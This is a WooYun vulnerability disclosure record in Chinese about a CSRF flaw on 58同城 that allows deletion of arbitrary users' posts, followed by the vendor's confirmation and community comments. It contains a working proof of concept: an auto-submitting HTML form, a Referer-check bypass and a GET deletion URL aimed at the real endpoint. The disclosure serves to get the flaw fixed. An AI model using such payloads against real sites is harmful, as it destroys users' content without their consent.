{"id": 12849, "wybug_id": "wooyun-2013-020862", "wybug_title": "58同城可猥琐方式删除任意用户帖子", "wybug_corp": "58同城", "wybug_author": "se55i0n", "wybug_date": "2013-03-29 09:21", "wybug_open_date": "2013-05-13 09:21", "wybug_type": "CSRF", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计缺陷", "越权操作", "敏感操作校验不足", "敏感接口缺乏校验", "平行权限"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-03-29：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-03-29：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-04-08：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-04-18：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-04-28：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-05-13：\t细节向公众公开  简要描述： 58的大牛送一对公仔呗！ 详细说明：  1）用户帖子ID信息泄露（后面删帖用到）、userid信息泄露（可与上个洞子配合使用）；1.1）发表一个帖子如下图所示；\n\n1.2）在个人中心查看帖子信息；\n\n1.3）看出来了吧，帖子的的页面地址为“帖子ID+x.shtml”，所以x前面的编号即为帖子ID；1.4）使用另一用户查看刚发布的帖子，点击查看\"该用户电话发帖记录\"，发现了用户的userid信息；\n\n2）可猥琐删除任意用户帖子；2.1）来到用户中心，点击删除刚发布的帖子并抓包；\nPOST /submit/infopost/?op=close HTTP/1.1Host: my.58.comProxy-Connection: keep-aliveContent-Length: 18Accept: text/plain, */*Origin: http://my.58.comX-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.172 Safari/537.22Content-Type: application/x-www-form-urlencodedReferer: http://my.58.com/index/?pts=1364491912016Accept-Encoding: gzip,deflate,sdchAccept-Language: zh-CN,zh;q=0.8Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3Cookie:...ids=13374799021446\n2.2)系统校验了referer但是校验不严格，通过形如“my.58.com.xxx.org”之类即可绕过防御，所以通过访问以下POC即可删除用户对应帖子；\n<html><body><form id=\"se55i0n\" name=\"se55i0n\" action=\"http://my.58.com/submit/infopost/?op=close\" method=\"POST\"><input type=\"text\" name=\"ids\" value=\"13374799021446\" ><input type=\"submit\" value=\"submit\" /></form><script>   document.se55i0n.submit();</script></body></html>\n2.3）没有完，更猥琐的在这里,发现居然还能通过GET方式来提交删帖请求（不应该哟）；\nhttp://my.58.com/submit/infopost/?op=close&ids=13374799021446\n2.5）再配合58同城的帮帮，在线交流，哈哈；\n\n2.6）用户访问即可删帖，看效果；\n\n2.7）返回用户中心，刷新下帖子真没了；\n\n   漏洞证明：  见详细说明   修复方案：     版权声明：转载请注明来源 se55i0n@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：12  确认时间：2013-03-29 11:30 厂商回复： 非常感谢提交漏洞，马上修复！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-03-29 09:50 |    \t\trqndx \t\t\t( 路人 |\t\t\t        Rank:9 漏洞数:3        | 种子发我邮箱：01010101010101010101010101...)\t\t \n  不知道为何，提交那么久的漏洞一直未审核？还是因为太小了看不起人呢？新网域名过户XSS可得管理COOKIES，国土资源局密码外泄。    \n     2013-03-29 10:05 |    \t\tse55i0n \t\t\t( 普通白帽子  |\t\t\t        Rank:1567 漏洞数:172        )\t\t \n  @rqndx  你可以漏洞链接发@xsser私信，不过你就爆他菊花*^_^*    \n     2013-03-29 10:13 |    \t\trqndx \t\t\t( 路人 |\t\t\t        Rank:9 漏洞数:3        | 种子发我邮箱：01010101010101010101010101...)\t\t \n  @se55i0n 。。 我说怎么哪里都能看到@xsser呢。。。原来是乌云的。。    \n     2013-03-29 11:01 |    \t\t带馅儿馒头 \t\t\t( 普通白帽子  |\t\t\t        Rank:1278 漏洞数:136        | 心在，梦在)\t\t \n  @rqndx 怎么你到处都在发同样评论,职业灌水？    \n     2013-04-30 16:58 |    \t\tsysALong \t\t\t( 路人 |\t\t\t        Rank:19 漏洞数:5        | 电脑里的AV片 永远 和 电脑旁的卫生纸 成 ...)\t\t \n  @se55i0n 乐死我了， 请问这个帖子是你的么？  一般人保证点击，点击后  后果不堪设想啊。    \n     2013-05-13 10:15 |    \t\t乌帽子 \t\t\t( 路人 |\t\t\t        Rank:29 漏洞数:3        | 学习黑客哪家强 | 中国山东找蓝翔 | sql...)\t\t \n  @sysALong 本来还是的，点了后就不是了！    \n     2013-05-13 12:18 |    \t\t小威 \t\t\t( 普通白帽子  |\t\t\t        Rank:492 漏洞数:67        | 活到老，学到老!)\t\t \n  膜拜撸主~    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 12, "Ranks": null}